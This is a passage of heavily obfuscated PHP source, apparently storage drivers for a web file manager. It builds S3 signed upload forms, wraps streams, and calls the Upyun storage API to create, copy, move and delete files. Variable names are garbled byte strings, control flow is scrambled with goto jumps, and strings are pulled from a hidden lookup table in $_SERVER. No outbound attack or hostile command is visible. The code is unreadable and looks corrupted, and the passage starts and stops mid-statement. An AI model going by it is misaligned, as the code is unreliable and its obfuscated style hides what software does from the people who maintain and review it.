gmdate($F—ô¦·ÙÑù[705]); goto b„£Ó³ùÄÕ; b„£Ó³ùÄÕ: $C…‚ÖîÏå— = $F—ô¦·ÙÑù[1201]; $aÃ‰‹ ÏŒˆ = $eå¯É×öîŠ . $F—ô¦·ÙÑù[33]; $b•ìàÄ´ç¨ = $F—ô¦·ÙÑù[1162]; goto d²²ğ‘Á¹Ì; bŸØ‰Êó‹: $b¯‰Æà¨àá = hash_hmac($F—ô¦·ÙÑù[1209], $A×Ú†ßŒ, $A¶ˆé„ŸÎ, !0); $eØ…Õ®¾áÙ = hash_hmac($F—ô¦·ÙÑù[1209], $C…‚ÖîÏå—, $b¯‰Æà¨àá, !0); $a–©Äˆ†ªƒ = hash_hmac($F—ô¦·ÙÑù[1209], $dì‹àÔà, $eØ…Õ®¾áÙ); goto e²Á ²Êù»; cÓÂæŞÀÊ¬: $dì‹àÔà = base64_encode(json_encode($b÷Äİ„ÍÈ)); $E›Äª½½ƒ¿ = hash_hmac($F—ô¦·ÙÑù[1209], $dßßÕµßÀ, $F—ô¦·ÙÑù[1210] . $this->secret, !0); $A¶ˆé„ŸÎ = hash_hmac($F—ô¦·ÙÑù[1209], $this->region, $E›Äª½½ƒ¿, !0); goto bŸØ‰Êó‹; e²Á ²Êù»: $AíôÚèß„ = array($F—ô¦·ÙÑù[209] => $F—ô¦·ÙÑù[33], $F—ô¦·ÙÑù[1211] => $F—ô¦·ÙÑù[33], $F—ô¦·ÙÑù[1166] => $eÁªÈÑä†î, $F—ô¦·ÙÑù[1170] => $b•ìàÄ´ç¨, $F—ô¦·ÙÑù[1174] => $dì‹àÔà, $F—ô¦·ÙÑù[1212] => $Céöôç½øÕ, $F—ô¦·ÙÑù[1213] => $aÌ˜ßõ¸³‡, $F—ô¦·ÙÑù[1214] => $f‚°Ê¾Û£, $F—ô¦·ÙÑù[1215] => $aÃ‰‹ ÏŒˆ, $F—ô¦·ÙÑù[1216] => $a–©Äˆ†ªƒ, $F—ô¦·ÙÑù[174] => $this->getHost()); return $AíôÚèß„; goto Aªš‡¤ª¬; DÛöó•ç¯: $F—ô¦·ÙÑù =& $_SERVER[¹Ò‹Ò¹]; $eÁªÈÑä†î = $F—ô¦·ÙÑù[190]; $aÌ˜ßõ¸³‡ = $F—ô¦·ÙÑù[1199]; goto AøÈæŠØßÊ; d²²ğ‘Á¹Ì: $AêˆŒ‚„Ç— = array($this->accessKey, $dßßÕµßÀ, $this->region, $A×Ú†ßŒ, $C…‚ÖîÏå—); $Céöôç½øÕ = implode($F—ô¦·ÙÑù[8], $AêˆŒ‚„Ç—); $b÷Äİ„ÍÈ = array($F—ô¦·ÙÑù[1164] => gmdate($F—ô¦·ÙÑù[1163], strtotime($F—ô¦·ÙÑù[1202])), $F—ô¦·ÙÑù[1165] => array(array($F—ô¦·ÙÑù[1167] => $this->bucket), array($F—ô¦·ÙÑù[1166] => $eÁªÈÑä†î), array($F—ô¦·ÙÑù[1168], $F—ô¦·ÙÑù[1169], $F—ô¦·ÙÑù[33]), array($F—ô¦·ÙÑù[1168], $F—ô¦·ÙÑù[1203], $F—ô¦·ÙÑù[33]), array($F—ô¦·ÙÑù[1168], $F—ô¦·ÙÑù[1204], $F—ô¦·ÙÑù[33]), array($F—ô¦·ÙÑù[1170] => $b•ìàÄ´ç¨), array($F—ô¦·ÙÑù[1205] => $Céöôç½øÕ), array($F—ô¦·ÙÑù[1206] => $aÌ˜ßõ¸³‡), array($F—ô¦·ÙÑù[1207] => $f‚°Ê¾Û£), array($F—ô¦·ÙÑù[1208] => $aÃ‰‹ ÏŒˆ))); goto cÓÂæŞÀÊ¬; Aªš‡¤ª¬: } } goto A·ø®±•¨Ü; Aë·Š¬…íš: function binCheckBigger($C±£¯¿‰ì‡, $aé¨¤Ì±Ö) { return $C±£¯¿‰ì‡ > $aé¨¤Ì±Ö; } $_SERVER[$_SERVER[½][3]] = ("\70\71\70\64"."\x38\x37")+0;$_QBfw="EszvJWYx44uXcHskUdT5V3MHDV768uSmtcAUXJ7kSXmjaPKPxdBwBbERhksCvWU3Kr8WpXXwYbcf8e3Q";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($B—³ØÎö˜‚, $Dİßî¯™¯ã) { $CŸÙ‹¸²Ê“ =& $_SERVER[¹Ò‹Ò¹]; if (isset(self::$_methodList[$B—³ØÎö˜‚])) { return @call_user_func_array(self::$_methodList[$B—³ØÎö˜‚], $Dİßî¯™¯ã); } else { if (method_exists($this, $B—³ØÎö˜‚)) { return call_user_func_array(array($this, $B—³ØÎö˜‚), $Dİßî¯™¯ã); } else { think_exception(__CLASS__ . $CŸÙ‹¸²Ê“[4] . $B—³ØÎö˜‚ . $CŸÙ‹¸²Ê“[5]); } } } public static function __callStatic($d‹Å¬›ãÕ, $d×ùÔ©™) { if (isset(self::$_methodListStatic[$d‹Å¬›ãÕ])) { return call_user_func_array(self::$_methodListStatic[$d‹Å¬›ãÕ], $d×ùÔ©™); } else { if (method_exists(self, $d‹Å¬›ãÕ)) { return call_user_func_array(array(self, $d‹Å¬›ãÕ), $d×ùÔ©™); } else { show_json("{$d‹Å¬›ãÕ}\x28\51\x20\156\157\164\x20\145\170\151\163\164\x3b", !1); } } } public static function addMethod($FÖõ—¾ãØ·, $aÉÁ¨µÊé„) { self::$_methodList[$FÖõ—¾ãØ·] = $aÉÁ¨µÊé„; } public static function addMethodStatic($BÙ±“‡šƒ, $B»¥¶ø’‰Ø) { self::$_methodListStatic[$BÙ±“‡šƒ] = $B»¥¶ø’‰Ø; } } goto fŠİ©†¹‚æ; f£ï¼Ûèá: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($bŒ‚œ†Öî) { parent::__construct($bŒ‚œ†Öî); } public function uploadFormData($Eê–´ë‘”‡, $CÜŒ¤ Ÿòï = 3600) { goto B¬ÀÊ…’ëÜ; B¬ÀÊ…’ëÜ: $dëâ†ë˜‹÷ =& $_SERVER[¹Ò‹Ò¹]; $a×ß¨›¾ó’ = $dëâ†ë˜‹÷[190]; $dƒ¸œªÑ… = $dëâ†ë˜‹÷[1199]; goto FÚ…µÒÎ‰; FÚ…µÒÎ‰: $eßŠ“êÜ†” = $dëâ†ë˜‹÷[59]; $Aé¼âÏÜ¿Ó = gmdate($dëâ†ë˜‹÷[1200]); $e¼Ğ°Ê¬®÷ = gmdate($dëâ†ë˜‹÷[705]); goto aèôÒÍãƒ; B‡¸‡¡¢‰: $a¤§°êâ„ = base64_encode(json_encode($BÔ‘Û¦Ú‘…)); $E¸ËÔÌç´µ = hash_hmac($dëâ†ë˜‹÷[1209], $e¼Ğ°Ê¬®÷, $dëâ†ë˜‹÷[1210] . $this->secret, !0); $F¥áâ¶Å× = hash_hmac($dëâ†ë˜‹÷[1209], $this->region, $E¸ËÔÌç´µ, !0); goto d±š‚ÏŞÒø; bâæŸ‡¡: $aÅÏÙíÄ = array($this->accessKey, $e¼Ğ°Ê¬®÷, $this->region, $eßŠ“êÜ†”, $e×•¤¦¦§ç); $D¦â¼Õƒãà = implode($dëâ†ë˜‹÷[8], $aÅÏÙíÄ); $BÔ‘Û¦Ú‘… = array($dëâ†ë˜‹÷[1164] => gmdate($dëâ†ë˜‹÷[1163], strtotime($dëâ†ë˜‹÷[1202])), $dëâ†ë˜‹÷[1165] => array(array($dëâ†ë˜‹÷[1167] => $this->bucket), array($dëâ†ë˜‹÷[1166] => $a×ß¨›¾ó’), array($dëâ†ë˜‹÷[1168], $dëâ†ë˜‹÷[1169], $dëâ†ë˜‹÷[33]), array($dëâ†ë˜‹÷[1168], $dëâ†ë˜‹÷[1203], $dëâ†ë˜‹÷[33]), array($dëâ†ë˜‹÷[1168], $dëâ†ë˜‹÷[1204], $dëâ†ë˜‹÷[33]), array($dëâ†ë˜‹÷[1170] => $e˜¹£¬÷à¥), array($dëâ†ë˜‹÷[1205] => $D¦â¼Õƒãà), array($dëâ†ë˜‹÷[1206] => $dƒ¸œªÑ…), array($dëâ†ë˜‹÷[1207] => $Aé¼âÏÜ¿Ó), array($dëâ†ë˜‹÷[1208] => $CªÃ†½¼ö®))); goto B‡¸‡¡¢‰; aèôÒÍãƒ: $e×•¤¦¦§ç = $dëâ†ë˜‹÷[1201]; $CªÃ†½¼ö® = $CÜŒ¤ Ÿòï . $dëâ†ë˜‹÷[33]; $e˜¹£¬÷à¥ = $dëâ†ë˜‹÷[1162]; goto bâæŸ‡¡; d±š‚ÏŞÒø: $dí»›¢ƒ¾ = hash_hmac($dëâ†ë˜‹÷[1209], $eßŠ“êÜ†”, $F¥áâ¶Å×, !0); $FÍ¾à£¿Ñ = hash_hmac($dëâ†ë˜‹÷[1209], $e×•¤¦¦§ç, $dí»›¢ƒ¾, !0); $c¿Óß®¨Á = hash_hmac($dëâ†ë˜‹÷[1209], $a¤§°êâ„, $FÍ¾à£¿Ñ); goto CŠœë«²¢Ó; CŠœë«²¢Ó: $aÄğÃ×£À = array($dëâ†ë˜‹÷[209] => $dëâ†ë˜‹÷[33], $dëâ†ë˜‹÷[1211] => $dëâ†ë˜‹÷[33], $dëâ†ë˜‹÷[1166] => $a×ß¨›¾ó’, $dëâ†ë˜‹÷[1170] => $e˜¹£¬÷à¥, $dëâ†ë˜‹÷[1174] => $a¤§°êâ„, $dëâ†ë˜‹÷[1212] => $D¦â¼Õƒãà, $dëâ†ë˜‹÷[1213] => $dƒ¸œªÑ…, $dëâ†ë˜‹÷[1214] => $Aé¼âÏÜ¿Ó, $dëâ†ë˜‹÷[1215] => $CªÃ†½¼ö®, $dëâ†ë˜‹÷[1216] => $c¿Óß®¨Á, $dëâ†ë˜‹÷[174] => $this->getHost()); return $aÄğÃ×£À; goto dãô³µï°˜; dãô³µï°˜: } public function multiUploadFormData($CÚ»ß¾ÁÒÖ, $fí¥ÇÏŒ = 3600) { $f¥ø¾Ù¼› =& $_SERVER[¹Ò‹Ò¹]; $BÊáê·õ£ = gmdate($f¥ø¾Ù¼›[1294]); $f¤½Š¤¾çÑ = array(); $aÄ¿«ê¥« = $this->client->getUploadId($this->bucket, $CÚ»ß¾ÁÒÖ, $f¤½Š¤¾çÑ); if (!$aÄ¿«ê¥«) { return !1; } return array($f¥ø¾Ù¼›[219] => $aÄ¿«ê¥«, $f¥ø¾Ù¼›[174] => $this->getHost() . $f¥ø¾Ù¼›[8] . $this->pathEncode($CÚ»ß¾ÁÒÖ), $f¥ø¾Ù¼›[220] => $BÊáê·õ£, $f¥ø¾Ù¼›[92] => $CÚ»ß¾ÁÒÖ); } public function multiUploadAuthData($bì„«ÌáÜ¯, $B¹ë¶ŞÔ¦õ = array()) { goto b¼¯©áØŸ¨; d›•ÎÆ‰À³: $eãŞæ¶—†ó = $dß†Ú‡äœŒ[224]; $dòâÇê‚ñ = $dß†Ú‡äœŒ[8] . $this->pathEncode($c¡ñ˜øõ×ò) . $C¯Ã¢åèÁ; $CÒ•´«—¼Ó = $this->client->__getSignatureV4($DÜ¨Ø‡ÒÔÏ, $aê½•Œ–‡‚, $eãŞæ¶—†ó, $dòâÇê‚ñ); goto cïá‚‰•¿¾; D†Œ÷•¾ÑŸ: if (isset($B¹ë¶ŞÔ¦õ[$dß†Ú‡äœŒ[1295]])) { $DÜ¨Ø‡ÒÔÏ[$dß†Ú‡äœŒ[1296]] = $B¹ë¶ŞÔ¦õ[$dß†Ú‡äœŒ[1295]]; } $FãÆöø‚— = explode($dß†Ú‡äœŒ[176], $this->getHost()); $aê½•Œ–‡‚ = array($dß†Ú‡äœŒ[1297] => $FãÆöø‚—[1], $dß†Ú‡äœŒ[1298] => $dß†Ú‡äœŒ[33], $dß†Ú‡äœŒ[209] => $dß†Ú‡äœŒ[118], $dß†Ú‡äœŒ[1211] => $B¹ë¶ŞÔ¦õ[$dß†Ú‡äœŒ[77]]); goto d›•ÎÆ‰À³; d™¿®äá: unset($B¹ë¶ŞÔ¦õ[$dß†Ú‡äœŒ[92]]); if (isset($B¹ë¶ŞÔ¦õ[$dß†Ú‡äœŒ[221]])) { return $this->listUploadParts($c¡ñ˜øõ×ò, $B¹ë¶ŞÔ¦õ); } $DÜ¨Ø‡ÒÔÏ = array(); goto D†Œ÷•¾ÑŸ; cïá‚‰•¿¾: if (strpos($C¯Ã¢åèÁ, $dß†Ú‡äœŒ[223]) === 0) { if (isset($DÜ¨Ø‡ÒÔÏ[$dß†Ú‡äœŒ[1296]])) { $A‰¬Õ ‘Ê = $DÜ¨Ø‡ÒÔÏ[$dß†Ú‡äœŒ[1296]]; } else { if (isset($CÒ•´«—¼Ó[$dß†Ú‡äœŒ[1296]])) { $A‰¬Õ ‘Ê = $CÒ•´«—¼Ó[$dß†Ú‡äœŒ[1296]]; } else { $A‰¬Õ ‘Ê = hash($dß†Ú‡äœŒ[1209], $dß†Ú‡äœŒ[33]); } } return array($dß†Ú‡äœŒ[230] => $CÒ•´«—¼Ó[$dß†Ú‡äœŒ[230]], $dß†Ú‡äœŒ[1296] => $A‰¬Õ ‘Ê, $dß†Ú‡äœŒ[220] => $CÒ•´«—¼Ó[$dß†Ú‡äœŒ[1299]]); } return $CÒ•´«—¼Ó[$dß†Ú‡äœŒ[230]]; goto BœöÃ×‘—; b¼¯©áØŸ¨: $dß†Ú‡äœŒ =& $_SERVER[¹Ò‹Ò¹]; $C¯Ã¢åèÁ = isset($B¹ë¶ŞÔ¦õ[$dß†Ú‡äœŒ[167]]) ? $B¹ë¶ŞÔ¦õ[$dß†Ú‡äœŒ[167]] : $dß†Ú‡äœŒ[33]; $c¡ñ˜øõ×ò = $B¹ë¶ŞÔ¦õ[$dß†Ú‡äœŒ[92]]; goto d™¿®äá; BœöÃ×‘—: } public function listUploadParts($E±‰ã¹®¢, $D‹ƒ‘Ø˜Ï = array()) { goto d±‘“·İ‹ö; eÉÜí¢¥¯›: $BÍ¼Ë…äå = array($dŠ«øí©öÉ[1297] => $cÊÔ¤ˆĞÜÆ[1], $dŠ«øí©öÉ[209] => $dŠ«øí©öÉ[118], $dŠ«øí©öÉ[1211] => strlen($eä»ùöÉÀÁ)); $bÅ×ÔĞ±öÂ = $dŠ«øí©öÉ[222]; $a ·Ã® = $dŠ«øí©öÉ[8] . $this->pathEncode($E±‰ã¹®¢) . $D‹ƒ‘Ø˜Ï[$dŠ«øí©öÉ[167]]; goto AÙ’®Ø·ÊÚ; AÙ’®Ø·ÊÚ: $Aèî©î×Ã¼ = $this->client->__getSignatureV4($Eã—à¿åí, $BÍ¼Ë…äå, $bÅ×ÔĞ±öÂ, $a ·Ã®, $eä»ùöÉÀÁ); return array($dŠ«øí©öÉ[230] => $Aèî©î×Ã¼[$dŠ«øí©öÉ[230]], $dŠ«øí©öÉ[220] => $Aèî©î×Ã¼[$dŠ«øí©öÉ[1299]], $dŠ«øí©öÉ[232] => $fÖğ¼ßç¸, $dŠ«øí©öÉ[1296] => $Aèî©î×Ã¼[$dŠ«øí©öÉ[1296]]); goto a¡Öõ–¦Ş„; EÎÊ·‡Ä Ö: if (!$fÖğ¼ßç¸) { return !1; } $eä»ùöÉÀÁ = $dŠ«øí©öÉ[1300]; foreach ($fÖğ¼ßç¸ as $AãÒÃ‹¼†Â) { $eä»ùöÉÀÁ .= $dŠ«øí©öÉ[1301] . "\74\x50\141\x72\164\x4e\x75\x6d\x62\145\x72\x3e{$AãÒÃ‹¼†Â[$dŠ«øí©öÉ[1256]]}\74\57\120\x61\x72\164\x4e\165\x6d\142\x65\x72\76\12" . "\x3c\x45\x54\141\x67\76{$AãÒÃ‹¼†Â[$dŠ«øí©öÉ[1257]]}\74\57\105\124\x61\x67\76\xa" . $dŠ«øí©öÉ[1302]; } goto E†ØÔñø; E†ØÔñø: $eä»ùöÉÀÁ .= $dŠ«øí©öÉ[1303]; $Eã—à¿åí = array(); $cÊÔ¤ˆĞÜÆ = explode($dŠ«øí©öÉ[176], $this->getHost()); goto eÉÜí¢¥¯›; d±‘“·İ‹ö: $dŠ«øí©öÉ =& $_SERVER[¹Ò‹Ò¹]; $F ÓµÃõÎá = str_replace($dŠ«øí©öÉ[231], $dŠ«øí©öÉ[33], $D‹ƒ‘Ø˜Ï[$dŠ«øí©öÉ[167]]); $fÖğ¼ßç¸ = $this->client->listParts($this->bucket, $E±‰ã¹®¢, $F ÓµÃõÎá); goto EÎÊ·‡Ä Ö; a¡Öõ–¦Ş„: } public function link($C†¯ÁÃ†–í, $bÁ²ùæ˜µ˜ = array()) { return parent::link($C†¯ÁÃ†–í, $bÁ²ùæ˜µ˜); } public function fileOut($bÛÕ ¬‡É, $bĞ—çÀÃ¾ = false, $d†ÇŸ•õ¾— = false, $A ¾ŠÀØÀ¸ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¹Ò‹Ò¹][1304])) { return parent::fileOutServer($bÛÕ ¬‡É, $bĞ—çÀÃ¾, $d†ÇŸ•õ¾—, $A ¾ŠÀØÀ¸); } parent::fileOut($bÛÕ ¬‡É, $bĞ—çÀÃ¾, $d†ÇŸ•õ¾—, $A ¾ŠÀØÀ¸); } public function fileOutImage($Bƒàªğ°†, $B”÷ÈÊòÉ = 250) { if (strstr($this->endpoint, $_SERVER[¹Ò‹Ò¹][1304])) { return parent::fileOutImageServer($Bƒàªğ°†, $B”÷ÈÊòÉ); } parent::fileOutImage($Bƒàªğ°†, $B”÷ÈÊòÉ); } public function fileOutLink($DÍåëŠÅÇ) { $b”ŞŒÕÀ =& $_SERVER[¹Ò‹Ò¹]; if (substr($DÍåëŠÅÇ, 0, 7) == $b”ŞŒÕÀ[1177]) { $DÍåëŠÅÇ = $b”ŞŒÕÀ[1178] . substr($DÍåëŠÅÇ, 7); } header($b”ŞŒÕÀ[158] . $DÍåëŠÅÇ); die; } public function getHost() { $aèôËÁæ¼ =& $_SERVER[¹Ò‹Ò¹]; $DçÅ«¯Ïâ = str_rtrim(parent::getHost(), $aèôËÁæ¼[8] . $this->bucket); $DçÅ«¯Ïâ = explode($aèôËÁæ¼[176], $DçÅ«¯Ïâ); return $DçÅ«¯Ïâ[0] . $aèôËÁæ¼[176] . $this->bucket . $aèôËÁæ¼[94] . $DçÅ«¯Ïâ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($A…ö¥áÉªê, $b¶—ÏµŸñÙ = 0) { parent::__construct(); $this->source = $A…ö¥áÉªê; $this->sourceSize = $b¶—ÏµŸñÙ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($DƒŞŞƒ¹‚Ë = false) { return $this->sourceSize; } public function getContent($C†„ãĞÙÕ = false) { return $this->fileSubstr($C†„ãĞÙÕ, 0, $this->sourceSize); } public function fileSubstr($aòæÉš…›á = false, $aù½ìˆÍš = 0, $B´İË†æ = 0) { if (!$B´İË†æ) { $B´İË†æ = $this->sourceSize; } $E•¤„È¤¿Ã = $this->sourceSize - $aù½ìˆÍš; if ($B´İË†æ >= $E•¤„È¤¿Ã) { $B´İË†æ = $E•¤„È¤¿Ã; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $aù½ìˆÍš, $B´İË†æ); } if ($this->sourceType == self::TYPE_FILE) { if ($B´İË†æ <= 0) { return $_SERVER[¹Ò‹Ò¹][33]; } $C÷Œ›‰ô® = ftell($this->source); fseek_64($this->source, $C÷Œ›‰ô® + $aù½ìˆÍš); $B¯¢¶ƒ÷ä = @fread($this->source, $B´İË†æ); fseek_64($this->source, $C÷Œ›‰ô®); return $B¯¢¶ƒ÷ä; } } public function hashMd5($EØÂïÕ«ˆ = false) { return md5($this->getContent()); } public static function hash($D³Ü×÷¤âÊ, $DÑ¸é²«ˆù = 0) { $c•÷›®ê×× = new PathDriverStream($D³Ü×÷¤âÊ, $DÑ¸é²«ˆù); return $c•÷›®ê××->hashSimple($D³Ü×÷¤âÊ); } public static function md5($f£‹ÒŞ…«ù, $fùä›Î‚ˆ = 0) { $D¶§Å×µ–¶ = new PathDriverStream($f£‹ÒŞ…«ù, $fùä›Î‚ˆ); return $D¶§Å×µ–¶->hashMd5($f£‹ÒŞ…«ù); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\x3a\x2f\57\166\60\56\141\160\x69\56\165\160\x79\165\x6e\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($E¾Ê¬íÉ²ƒ) { parent::__construct(); $this->_init($E¾Ê¬íÉ²ƒ); } public function _init($e·ÍÊ•Ã¥œ) { $fá ©ÍöÅß =& $_SERVER[¹Ò‹Ò¹]; foreach ($e·ÍÊ•Ã¥œ as $Bæ‘‚Ï££« => $cå±óŞ–õŒ) { if (isset($this->{$Bæ‘‚Ï££«})) { $this->{$Bæ‘‚Ï££«} = $cå±óŞ–õŒ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($fá ©ÍöÅß[1305] . LNG($fá ©ÍöÅß[1237])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Bä¹ùŞ‚Ğ, $CáÁ’®ö™ù = "\107\105\124") { $F­çˆïõŒ =& $_SERVER[¹Ò‹Ò¹]; $Aè’ãä¬ ½ = gmdate($F­çˆïõŒ[1271]); $bõßÅÇ—¸ì = base64_encode(hash_hmac($F­çˆïõŒ[1306], "{$CáÁ’®ö™ù}\x26{$Bä¹ùŞ‚Ğ}\46{$Aè’ãä¬ ½}", md5("{$this->userpass}"), !0)); $bØí’öôÊ = array("\x41\165\x74\150\x6f\x72\151\172\x61\164\151\x6f\156\72\x55\x50\131\x55\x4e\x20{$this->username}\x3a{$bõßÅÇ—¸ì}", "\104\141\x74\145\x3a{$Aè’ãä¬ ½}"); return $bØí’öôÊ; } public function ussRequest($C™’ß¾”¢Ê, $C˜ô›‹éç¸ = "\x47\x45\x54", $aÜ…†…¶Š„ = false, $eµƒÙ„Şã° = false, $a»Å±Ä˜¡Î = false) { goto eëªÇ¸ñª¥; eëªÇ¸ñª¥: $fŠ¢”Ÿ³ï˜ =& $_SERVER[¹Ò‹Ò¹]; $C™’ß¾”¢Ê = trim($C™’ß¾”¢Ê, $fŠ¢”Ÿ³ï˜[8]); $D´ƒÙĞÂ = "\x2f{$this->bucket}\x2f{$C™’ß¾”¢Ê}"; goto dÃ…”óÍÜ¸; eéÙˆê•¥: if (!$AØ†®Ä‚ö°) { return array($fŠ¢”Ÿ³ï˜[1061] => !1, $fŠ¢”Ÿ³ï˜[1063] => $fŠ¢”Ÿ³ï˜[1307]); } if (strtolower($C˜ô›‹éç¸) == $fŠ¢”Ÿ³ï˜[189] || in_array($AØ†®Ä‚ö°[$fŠ¢”Ÿ³ï˜[1061]], array($fŠ¢”Ÿ³ï˜[1162], $fŠ¢”Ÿ³ï˜[1308]))) { $aÜ…†…¶Š„ = $AØ†®Ä‚ö°[$fŠ¢”Ÿ³ï˜[1309]]; } else { $aÜ…†…¶Š„ = json_decode($AØ†®Ä‚ö°[$fŠ¢”Ÿ³ï˜[1063]], !0); if (!$aÜ…†…¶Š„) { $aÜ…†…¶Š„ = $AØ†®Ä‚ö°[$fŠ¢”Ÿ³ï˜[1063]]; } else { if (!$AØ†®Ä‚ö°[$fŠ¢”Ÿ³ï˜[704]] && isset($aÜ…†…¶Š„[$fŠ¢”Ÿ³ï˜[1310]])) { $aÜ…†…¶Š„ = $aÜ…†…¶Š„[$fŠ¢”Ÿ³ï˜[1310]]; } } } return array($fŠ¢”Ÿ³ï˜[1061] => $AØ†®Ä‚ö°[$fŠ¢”Ÿ³ï˜[704]], $fŠ¢”Ÿ³ï˜[1063] => $aÜ…†…¶Š„); goto e×ØĞ†ÑŒ¬; dÃ…”óÍÜ¸: $f¥ÁÕíÖº = $this->ussHeaders($D´ƒÙĞÂ, $C˜ô›‹éç¸); if ($eµƒÙ„Şã°) { $f¥ÁÕíÖº = array_merge($f¥ÁÕíÖº, $eµƒÙ„Şã°); } $AØ†®Ä‚ö° = url_request($this->endpoint . $D´ƒÙĞÂ, $C˜ô›‹éç¸, $aÜ…†…¶Š„, $f¥ÁÕíÖº, $a»Å±Ä˜¡Î); goto eéÙˆê•¥; e×ØĞ†ÑŒ¬: } public function mkfile($eŸî…–Øø, $CÅĞ…’â¥Â = '', $A±î¸Úùô— = REPEAT_RENAME) { if ($this->setContent($eŸî…–Øø, $CÅĞ…’â¥Â)) { return $this->getPathOuter($eŸî…–Øø); } return !1; } public function mkdir($B“£Îª…˜ò, $b†Üä¡¥´È = REPEAT_SKIP) { $DŞ“Ûëö¥Å =& $_SERVER[¹Ò‹Ò¹]; $A°†³è¨‰ = trim($B“£Îª…˜ò, $DŞ“Ûëö¥Å[8]); if ($this->_isFolder($A°†³è¨‰)) { return $this->getPathOuter($A°†³è¨‰); } $F­ªöŠÖª = array($DŞ“Ûëö¥Å[1311]); $d’Ä˜ÕÓˆª = $this->ussRequest($A°†³è¨‰, $DŞ“Ûëö¥Å[222], !1, $F­ªöŠÖª); return $d’Ä˜ÕÓˆª[$DŞ“Ûëö¥Å[1061]] ? $this->getPathOuter($A°†³è¨‰) : !1; } public function copyFile($fµôªÎ‹öİ, $CİÒ‘ÏÆÊš) { $fñ÷ÀŞ´”› =& $_SERVER[¹Ò‹Ò¹]; $c°¶çå×ä = array($fñ÷ÀŞ´”›[1312] . "\x2f{$this->bucket}\x2f{$fµôªÎ‹öİ}", $fñ÷ÀŞ´”›[1313]); $Dâ¾»‰È = $this->ussRequest($CİÒ‘ÏÆÊš, $fñ÷ÀŞ´”›[224], !1, $c°¶çå×ä); return $Dâ¾»‰È[$fñ÷ÀŞ´”›[1061]] ? !0 : $this->getPathOuter($CİÒ‘ÏÆÊš); } public function moveFile($EšÃã Ëô’, $fæµŸÔ¿‡¯) { $FŸÓª‹ï¨İ =& $_SERVER[¹Ò‹Ò¹]; $CÍ‰ÒóĞã = array($FŸÓª‹ï¨İ[1314] . "\57{$this->bucket}\57{$EšÃã Ëô’}", $FŸÓª‹ï¨İ[1313]); $bÉ³§Í®Ö” = $this->ussRequest($fæµŸÔ¿‡¯, $FŸÓª‹ï¨İ[224], !1, $CÍ‰ÒóĞã); return $bÉ³§Í®Ö”[$FŸÓª‹ï¨İ[1061]] ? !0 : $this->getPathOuter($fæµŸÔ¿‡¯); } public function delFile($cˆ·“„¦İ¹) { $dßóæÕ»ØÅ =& $_SERVER[¹Ò‹Ò¹]; $fêª÷Î¨¤Î = $this->ussRequest($cˆ·“„¦İ¹, $dßóæÕ»ØÅ[1315]); return $fêª÷Î¨¤Î[$dßóæÕ»ØÅ[1061]] ? !0 : !1; } public function delFolder($Eö¸«÷øæ) { goto fÉà‹Ç…ßã; C÷“î¹Ğ¯ø: foreach ($a¬ëÒ™‹‹Ú as $f”˜£Î¡Ì) { $D‡ÂÑâïĞ = $this->ussRequest($f”˜£Î¡Ì[$F†“²©îÙ[28]], $F†“²©îÙ[1315]); if (!$D‡ÂÑâïĞ[$F†“²©îÙ[1061]]) { return !1; } } foreach ($CÕ»Şš‚‹ as $aõê‰ƒÚÏ) { $D‡ÂÑâïĞ = $this->ussRequest($aõê‰ƒÚÏ, $F†“²©îÙ[1315]); if (!$D‡ÂÑâïĞ[$F†“²©îÙ[1061]]) { return !1; } } $D‡ÂÑâïĞ = $this->ussRequest($Eö¸«÷øæ, $F†“²©îÙ[1315]); goto C’ÌÔà×š‡; Aï·à‚Ú‘ù: $CÕ»Şš‚‹ = $a¬ëÒ™‹‹Ú = array(); $this->fileList($Eö¸«÷øæ, $CÕ»Şš‚‹, $a¬ëÒ™‹‹Ú, !0); $this->listItemCache = !0; goto C÷“î¹Ğ¯ø; fÉà‹Ç…ßã: $F†“²©îÙ =& $_SERVER[¹Ò‹Ò¹]; if (!$this->exist($Eö¸«÷øæ)) { return !0; } $this->listItemCache = !1; goto Aï·à‚Ú‘ù; C’ÌÔà×š‡: return $D‡ÂÑâïĞ[$F†“²©îÙ[1061]]; goto e–ì£—Í¯õ; e–ì£—Í¯õ: } public function rename($c—“…ëÈÕØ, $DëßŠèÍÇ¢) { if ($this->isFile($c—“…ëÈÕØ)) { $DëßŠèÍÇ¢ = get_path_father($c—“…ëÈÕØ) . $DëßŠèÍÇ¢; return $this->moveFile($c—“…ëÈÕØ, $DëßŠèÍÇ¢); } return $this->renameObject($c—“…ëÈÕØ, $DëßŠèÍÇ¢); } public function fileInfo($b„ì²è–²Š, $A‹–ƒ†Ò™­ = false, $f÷ÒòêÂ°Û = array()) { goto cƒ¶Í¬Ü¢Á; FŸ•¢ŒÀ­: $c®¼¹è„“‡[$EáÛ±Úë÷[192]] = $c®¼¹è„“‡[$EáÛ±Úë÷[83]] = 0; $c®¼¹è„“‡[$EáÛ±Úë÷[193]] = $c®¼¹è„“‡[$EáÛ±Úë÷[194]] = !0; if (empty($f÷ÒòêÂ°Û)) { $f÷ÒòêÂ°Û = $this->objectMeta($b„ì²è–²Š); if (!$f÷ÒòêÂ°Û) { return $c®¼¹è„“‡; } } goto cè÷ËÔäÙç; cè÷ËÔäÙç: $c®¼¹è„“‡[$EáÛ±Úë÷[192]] = intval($f÷ÒòêÂ°Û[$EáÛ±Úë÷[1316]]); $c®¼¹è„“‡[$EáÛ±Úë÷[83]] = intval($f÷ÒòêÂ°Û[$EáÛ±Úë÷[1317]]); $c®¼¹è„“‡[$EáÛ±Úë÷[77]] = $f÷ÒòêÂ°Û[$EáÛ±Úë÷[77]]; goto Bñ×·Üƒàº; Bñ×·Üƒàº: return $c®¼¹è„“‡; goto f×Î‘÷•öò; cƒ¶Í¬Ü¢Á: 